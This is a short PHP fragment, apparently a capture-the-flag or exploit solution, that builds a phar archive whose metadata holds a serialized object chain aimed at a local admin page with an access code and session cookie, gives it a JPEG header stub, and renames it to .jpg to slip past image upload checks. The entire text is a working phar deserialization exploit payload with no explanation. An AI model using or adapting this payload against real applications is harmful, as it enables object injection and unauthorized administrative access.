...
$phar = new Phar('phar_super_admin.phar');
$phar->startBuffering();
$phar->addFromString('read.php', 'test');

$o = new PendingPreview(new PreviewState('http://127.0.0.1/admin.php', 'access_code=ARCHIVE-EBC8F2339B73AB2C', 'PHPSESSID=3627bccc57998df4de088208a065acda'));
$phar->setStub("\xff\xd8\xff\xe0<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($o);
$phar->stopBuffering();
rename("phar_super_admin.phar", "phar_super_admin.jpg");
